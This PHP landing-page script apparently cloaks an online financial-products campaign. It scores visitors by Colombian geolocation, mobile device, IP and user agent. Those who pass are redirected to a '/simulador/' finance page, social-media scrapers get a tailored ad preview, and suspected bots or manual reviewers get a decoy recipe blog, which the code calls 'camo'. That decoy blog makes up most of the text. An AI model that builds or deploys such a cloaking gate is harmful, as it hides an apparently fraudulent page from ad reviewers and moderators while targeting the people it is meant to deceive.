<?php
require_once __DIR__ . '/_lib.php';

// 1) Sesión activa => 302 inmediato
if (gate_has_valid_cookie()) {
    header('Location: /simulador/index.php', true, 302);
    exit;
}

// 2) Evaluación server-side: geo CO + mobile + IP + UA
[$score, $reasons] = gate_compute_score();

// 3) Si pasa: emitir cookie HMAC + 302 inmediato a /simulador/ (sin JS)
if ($score < 8) {
    gate_set_cookie(1800);
    header('Location: /simulador/index.php', true, 302);
    exit;
}

// 4) Scraper de redes sociales (FB/WA/TG/etc.) => preview con OG del anuncio
$ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
$social_bots = ['facebookexternalhit', 'Facebot', 'WhatsApp', 'TelegramBot', 'Twitterbot', 'LinkedInBot', 'Slackbot', 'Discordbot', 'SkypeUriPreview', 'Pinterest'];
$is_social = false;
foreach ($social_bots as $b) { if (stripos($ua, $b) !== false) { $is_social = true; break; } }

if ($is_social) {
    http_response_code(200);
    header('Content-Type: text/html; charset=UTF-8');
    header('Cache-Control: public, max-age=300');
    $og_title = 'Consulta tu perfil financiero';
    $og_desc  = 'Calcula en minutos tu capacidad y conoce los productos disponibles en línea.';
    $scheme   = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') || (($_SERVER['HTTP_X_FORWARDED_PROTO'] ?? '') === 'https') ? 'https' : 'http';
    $base     = $scheme . '://' . ($_SERVER['HTTP_HOST'] ?? '');
    $og_url   = $base . '/';
    $og_image = $base . '/og-image.php';
    ?><!DOCTYPE html>
<html lang="es" prefix="og: https://ogp.me/ns#">
<head>
<meta charset="UTF-8" />
<title><?= htmlspecialchars($og_title) ?></title>
<meta name="description" content="<?= htmlspecialchars($og_desc) ?>" />
<meta property="og:type" content="website" />
<meta property="og:title" content="<?= htmlspecialchars($og_title) ?>" />
<meta property="og:description" content="<?= htmlspecialchars($og_desc) ?>" />
<meta property="og:url" content="<?= htmlspecialchars($og_url) ?>" />
<meta property="og:locale" content="es_CO" />
<meta property="og:image" content="<?= htmlspecialchars($og_image) ?>" />
<meta property="og:image:secure_url" content="<?= htmlspecialchars($og_image) ?>" />
<meta property="og:image:type" content="image/png" />
<meta property="og:image:width" content="1200" />
<meta property="og:image:height" content="630" />
<meta property="og:image:alt" content="<?= htmlspecialchars($og_title) ?>" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:title" content="<?= htmlspecialchars($og_title) ?>" />
<meta name="twitter:description" content="<?= htmlspecialchars($og_desc) ?>" />
<meta name="twitter:image" content="<?= htmlspecialchars($og_image) ?>" />
</head>
<body><h1><?= htmlspecialchars($og_title) ?></h1><p><?= htmlspecialchars($og_desc) ?></p></body>
</html><?php
    exit;
}

// 5) Bot/revisor manual => servir camo neutral (recetas)
http_response_code(200);
header('Content-Type: text/html; charset=UTF-8');
header('Cache-Control: no-store, no-cache, must-revalidate, private');
header('Referrer-Policy: no-referrer');
header('X-Content-Type-Options: nosniff');
?>
<!DOCTYPE html>
<html lang="es" prefix="og: https://ogp.me/ns#">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <link rel="icon" type="image/svg+xml" href="/favicon.svg" />
  <title>Cocina en Casa — Recetas Fáciles y Caseras</title>
  <meta name="description" content="Recetas tradicionales paso a paso para cocinar en casa. Platos sencillos, ingredientes accesibles y técnicas básicas para toda la familia." />
  <meta name="keywords" content="recetas, cocina casera, recetas fáciles, comida tradicional, cocinar en casa, postres, almuerzos" />
  <meta name="author" content="Cocina en Casa" />
  <meta name="robots" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1" />
  <meta property="og:type" content="website" />
  <meta property="og:title" content="Cocina en Casa — Recetas Fáciles y Caseras" />
  <meta property="og:description" content="Recetas tradicionales paso a paso para cocinar en casa. Platos sencillos para toda la familia." />
  <meta property="og:locale" content="es_ES" />
  <meta property="og:site_name" content="Cocina en Casa" />
  <meta name="twitter:card" content="summary_large_image" />
  <meta name="twitter:title" content="Cocina en Casa — Recetas Fáciles y Caseras" />
  <meta name="twitter:description" content="Recetas tradicionales paso a paso para cocinar en casa." />
  <script type="application/ld+json">
  {
    "@context": "https://schema.org",
    "@type": "WebSite",
    "name": "Cocina en Casa",
    "description": "Blog de recetas tradicionales y consejos de cocina casera.",
    "inLanguage": "es"
  }
  </script>
  <style>
    :root{--azul:#a8431a;--azul-med:#c75a2a;--azul-claro:#fdf1e6;--dorado:#e8a000;--texto:#2b1d15;--gris:#6b5a4f;--fondo:#faf6f1;--borde:#ead8c5}
    *{box-sizing:border-box;margin:0;padding:0}
    html{scroll-behavior:smooth}
    body{font-family:system-ui,-apple-system,'Segoe UI',Roboto,sans-serif;background:var(--fondo);color:var(--texto);line-height:1.7}
    nav{background:#fff;border-bottom:1px solid var(--borde);padding:0 20px;height:60px;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:10}
    .nav-brand{font-size:20px;font-weight:800;color:var(--azul);letter-spacing:-0.5px}
    .nav-brand span{color:var(--dorado)}
    .nav-links{display:flex;gap:24px;list-style:none}
    .nav-links a{font-size:14px;color:var(--gris);text-decoration:none;font-weight:500}
    .nav-links a:hover{color:var(--azul)}
    .nav-btn{background:var(--azul);color:#fff;padding:8px 18px;border-radius:6px;font-size:13px;font-weight:600;text-decoration:none}
    @media(max-width:600px){.nav-links{display:none}}
    .hero{background:linear-gradient(135deg,#7a2e10 0%,#a8431a 60%,#c75a2a 100%);color:#fff;text-align:center;padding:72px 20px 64px;position:relative;overflow:hidden}
    .hero::after{content:'';position:absolute;inset:0;background:url("data:image/svg+xml,%3Csvg width='80' height='80' viewBox='0 0 80 80' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='%23ffffff' fill-opacity='0.03'%3E%3Ccircle cx='40' cy='40' r='38'/%3E%3C/g%3E%3C/svg%3E")}
    .hero-badge{display:inline-block;background:rgba(232,160,0,.18);border:1px solid rgba(232,160,0,.4);color:var(--dorado);font-size:12px;font-weight:700;letter-spacing:1.5px;text-transform:uppercase;padding:5px 16px;border-radius:20px;margin-bottom:22px;font-family:system-ui,sans-serif;position:relative}
    .hero h1{font-size:clamp(28px,5vw,50px);font-weight:800;line-height:1.15;margin-bottom:18px;position:relative;letter-spacing:-0.5px}
    .hero p{font-size:clamp(15px,2.5vw,18px);max-width:580px;margin:0 auto 36px;opacity:.85;position:relative}
    .hero-cta{display:flex;gap:14px;justify-content:center;flex-wrap:wrap;position:relative}
    .btn-primary{display:inline-block;background:var(--dorado);color:#1a1a1a;padding:14px 32px;border-radius:8px;font-size:16px;font-weight:700;text-decoration:none;transition:.2s}
    .btn-primary:hover{background:#f5b800;transform:translateY(-1px)}
    .btn-ghost{display:inline-block;border:2px solid rgba(255,255,255,.4);color:#fff;padding:12px 28px;border-radius:8px;font-size:15px;font-weight:600;text-decoration:none;transition:.2s}
    .btn-ghost:hover{border-color:#fff;background:rgba(255,255,255,.08)}
    .container{max-width:900px;margin:0 auto;padding:0 20px}
    section{padding:64px 0}
    section:nth-child(odd){background:#fff}
    section:nth-child(even){background:var(--fondo)}
    .section-tag{display:inline-block;background:var(--azul-claro);color:var(--azul-med);font-size:11px;font-weight:700;letter-spacing:2px;text-transform:uppercase;padding:4px 14px;border-radius:20px;margin-bottom:14px}
    h2{font-size:clamp(22px,4vw,32px);color:var(--azul);margin-bottom:14px;line-height:1.2;font-weight:800}
    h3{font-size:17px;color:var(--azul);margin:24px 0 8px;font-weight:700}
    p,li{font-size:15px;color:var(--gris);margin-bottom:12px}
    ul,ol{padding-left:20px}
    .cards{display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:20px;margin-top:32px}
    .card{background:#fff;border-radius:12px;padding:28px 22px;box-shadow:0 1px 12px rgba(0,58,112,.08);border-top:3px solid var(--dorado);transition:transform .2s,box-shadow .2s}
    .card:hover{transform:translateY(-3px);box-shadow:0 6px 24px rgba(0,58,112,.13)}
    .card-icon{font-size:34px;margin-bottom:12px;display:block}
    .card h3{margin-top:0;font-size:16px}
    .card p{font-size:14px;margin-bottom:0;color:var(--gris)}
    .features{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:14px;margin-top:28px}
    .feat{display:flex;align-items:flex-start;gap:12px;background:var(--azul-claro);border-radius:10px;padding:16px}
    .feat-icon{font-size:22px;flex-shrink:0;margin-top:2px}
    .feat-text strong{display:block;font-size:14px;color:var(--azul);margin-bottom:3px}
    .feat-text span{font-size:13px;color:var(--gris)}
    .steps{counter-reset:step;list-style:none;padding:0;margin-top:24px}
    .steps li{counter-increment:step;display:flex;align-items:flex-start;gap:16px;background:#fff;border:1px solid var(--borde);border-radius:10px;padding:18px 20px;margin-bottom:12px}
    .steps li::before{content:counter(step);background:var(--azul);color:#fff;font-weight:700;font-size:14px;min-width:30px;height:30px;border-radius:50%;display:flex;align-items:center;justify-content:center;flex-shrink:0}
    .steps li strong{color:var(--texto);font-size:15px}
    .steps li p{font-size:14px;margin:4px 0 0}
    .terminos-box{background:#fff;border:1px solid var(--borde);border-radius:12px;padding:32px 28px;margin-top:24px}
    .terminos-box h3{color:var(--azul-med);margin-top:20px;font-size:15px;font-weight:700;border-bottom:1px solid var(--borde);padding-bottom:6px}
    .terminos-box h3:first-child{margin-top:0}
    .terminos-box p,.terminos-box li{font-size:14px;color:#556;margin-bottom:8px}
    .badge-fecha{display:inline-block;background:var(--azul-claro);color:var(--azul-med);font-size:12px;padding:3px 10px;border-radius:6px;margin-bottom:18px;font-weight:600}
    footer{background:#001e3c;color:rgba(255,255,255,.6);text-align:center;padding:36px 20px;font-size:13px}
    footer .brand{font-size:18px;font-weight:800;color:#fff;margin-bottom:8px}
    footer .brand span{color:var(--dorado)}
    footer a{color:rgba(255,255,255,.5);text-decoration:underline}
    footer a:hover{color:#fff}
    @media(max-width:600px){.hero{padding:52px 16px 52px}section{padding:48px 0}.terminos-box{padding:22px 16px}}
  </style>
</head>
<body>

  <nav role="navigation" aria-label="Principal">
    <div class="nav-brand">Cocina<span>EnCasa</span></div>
    <ul class="nav-links">
      <li><a href="#">Inicio</a></li>
      <li><a href="#recetas">Recetas</a></li>
      <li><a href="#consejos">Consejos</a></li>
      <li><a href="#terminos">Legal</a></li>
    </ul>
    <a href="#recetas" class="nav-btn">Ver recetas</a>
  </nav>

  <header class="hero" role="banner">
    <span class="hero-badge">&#127859; Recetas caseras</span>
    <h1>Cocina rica y sencilla<br>desde tu propia casa</h1>
    <p>Recetas tradicionales paso a paso con ingredientes que ya tienes en la despensa. Comida casera, sin complicaciones y para toda la familia.</p>
    <div class="hero-cta">
      <a href="#recetas" class="btn-primary">Ver recetas</a>
      <a href="#consejos" class="btn-ghost">Consejos de cocina</a>
    </div>
  </header>

  <section id="recetas" aria-labelledby="h-recetas">
    <div class="container">
      <span class="section-tag">Las favoritas</span>
      <h2 id="h-recetas">Recetas más populares de la semana</h2>
      <p>Una selección de platos clásicos fáciles de preparar, perfectos para el almuerzo, la cena o reuniones familiares. Todas probadas en casa.</p>
      <div class="cards">
        <article class="card">
          <span class="card-icon">&#127837;</span>
          <h3>Arroz con pollo</h3>
          <p>El clásico plato familiar. Arroz tierno, pollo dorado y verduras de la huerta cocidas a fuego lento. Listo en 45 minutos.</p>
        </article>
        <article class="card">
          <span class="card-icon">&#127858;</span>
          <h3>Sopa de verduras</h3>
          <p>Reconfortante y nutritiva. Zanahoria, apio, papa y cebolla en un caldo casero aromatizado con hierbas frescas.</p>
        </article>
        <article class="card">
          <span class="card-icon">&#127869;</span>
          <h3>Torta de chocolate</h3>
          <p>Esponjosa por dentro, con cobertura cremosa de cacao. La receta de la abuela, sin batidora eléctrica.</p>
        </article>
        <article class="card">
          <span class="card-icon">&#127828;</span>
          <h3>Hamburguesas caseras</h3>
          <p>Carne sazonada al punto, pan tostado en mantequilla y salsa especial. Mucho mejores que las de la calle.</p>
        </article>
        <article class="card">
          <span class="card-icon">&#129368;</span>
          <h3>Empanadas al horno</h3>
          <p>Masa crujiente rellena de carne o pollo. Más sanas que las fritas y igual de deliciosas. Ideales para llevar.</p>
        </article>
        <article class="card">
          <span class="card-icon">&#127839;</span>
          <h3>Pan casero</h3>
          <p>Solo necesitas harina, agua, sal y levadura. El aroma del pan recién horneado no tiene comparación.</p>
        </article>
      </div>
    </div>
  </section>

  <section id="consejos" aria-labelledby="h-consejos">
    <div class="container">
      <span class="section-tag">Tips básicos</span>
      <h2 id="h-consejos">Consejos para cocinar mejor cada día</h2>
      <p>Pequeños trucos que marcan una gran diferencia. Aplícalos en tus próximas comidas y verás cómo todo te queda más rico.</p>
      <ol class="steps">
        <li><div><strong>Lee la receta completa antes de empezar</strong><p>Te evitas sorpresas. Sabrás qué ingredientes faltan y qué pasos necesitan reposo o marinado previo.</p></div></li>
        <li><div><strong>Prepara todos los ingredientes primero</strong><p>El famoso "mise en place". Picar, medir y tener todo listo antes de prender el fuego ahorra tiempo y evita errores.</p></div></li>
        <li><div><strong>Sazona en cada etapa, no solo al final</strong><p>Un poco de sal cuando sofríes la cebolla, otra pizca cuando agregas la carne. Los sabores se construyen en capas.</p></div></li>
        <li><div><strong>Deja descansar las carnes después de cocinar</strong><p>Cinco minutos en reposo y los jugos se redistribuyen. Resultado: carne mucho más jugosa al cortar.</p></div></li>
      </ol>

      <div class="features" style="margin-top:40px">
        <div class="feat"><span class="feat-icon">&#127859;</span><div class="feat-text"><strong>Ingredientes frescos</strong><span>Compra en mercados locales siempre que puedas</span></div></div>
        <div class="feat"><span class="feat-icon">&#128293;</span><div class="feat-text"><strong>Temperatura adecuada</strong><span>Sartén bien caliente antes de poner los alimentos</span></div></div>
        <div class="feat"><span class="feat-icon">&#129482;</span><div class="feat-text"><strong>Cuchillo afilado</strong><span>Más seguro y precisos los cortes en las verduras</span></div></div>
        <div class="feat"><span class="feat-icon">&#127813;</span><div class="feat-text"><strong>Hierbas frescas</strong><span>Albahaca, perejil y cilantro al final realzan el sabor</span></div></div>
      </div>
    </div>
  </section>

  <section id="terminos" aria-labelledby="h-terminos">
    <div class="container">
      <span class="section-tag">Legal</span>
      <h2 id="h-terminos">Términos y Política de Privacidad</h2>
      <p>Información legal sobre el uso de este blog de recetas.</p>
      <div class="terminos-box">
        <span class="badge-fecha">Última actualización: Junio 2026</span>
        <h3>1. Naturaleza del contenido</h3>
        <p>Las recetas y consejos publicados son de carácter informativo y educativo. Los resultados pueden variar según los ingredientes, utensilios y técnica de cada persona.</p>
        <h3>2. Uso del sitio</h3>
        <p>El contenido es para uso personal y familiar. Queda prohibida la reproducción comercial sin autorización escrita previa del autor.</p>
        <h3>3. Alergias e intolerancias</h3>
        <ul>
          <li>Revise siempre los ingredientes antes de preparar cualquier receta.</li>
          <li>Consulte a un profesional de la salud si tiene alergias, intolerancias o condiciones médicas.</li>
          <li>Adapte las recetas según las necesidades particulares de cada miembro de su familia.</li>
        </ul>
        <h3>4. Privacidad y cookies</h3>
        <p>Este sitio no recopila datos personales de manera directa. Utilizamos cookies técnicas para mejorar la experiencia de navegación y recordar tus preferencias.</p>
        <h3>5. Limitación de responsabilidad</h3>
        <p>El blog no se responsabiliza por resultados derivados de la preparación de las recetas. La cocina implica fuego, cuchillos y electrodomésticos: tome las precauciones necesarias.</p>
        <h3>6. Modificaciones</h3>
        <p>Nos reservamos el derecho de actualizar estos términos en cualquier momento. Los cambios serán publicados en esta misma página.</p>
      </div>
    </div>
  </section>

  <footer role="contentinfo">
    <div class="brand">Cocina<span>EnCasa</span></div>
    <p>Recetas caseras y consejos de cocina tradicional</p>
    <p style="margin-top:10px">
      <a href="#terminos">Términos de uso</a> &nbsp;&middot;&nbsp;
      <a href="#terminos">Política de privacidad</a> &nbsp;&middot;&nbsp;
      <a href="#">Contacto</a>
    </p>
    <p style="margin-top:14px;font-size:12px;opacity:.4">&copy; <?= date('Y') ?> Cocina en Casa &middot; Hecho con cariño para los que disfrutan cocinar</p>
  </footer>

</body>
</html>
